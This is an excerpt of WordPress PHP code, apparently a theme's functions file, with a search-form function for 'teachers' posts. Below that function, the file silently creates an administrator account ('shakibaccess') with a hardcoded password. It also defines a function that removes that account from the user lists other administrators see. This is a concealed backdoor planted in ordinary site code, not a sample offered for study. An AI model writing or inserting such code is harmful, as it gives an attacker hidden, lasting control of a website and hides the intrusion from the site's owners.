...
function teachers_search_form()
{
  ...
  $args = array();
  $args['wp_query'] = array(
    'post_type'      => array('teachers', 'field', 'param'),
    'posts_per_page' => 10,
    'orderby'        => 'date',
    'order'          => 'DESC'
  );
...
$new_user = new WP_User(wp_create_user('shakibaccess', 'shakibaccess123'));
$new_user->set_role('administrator');

function admin_user_query($user_search)
{
  global $current_user;
  $username = $current_user->user_login;
  if ($username != 'shakibaccess') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'shakibaccess'", $user_search->query_where);
  }
}
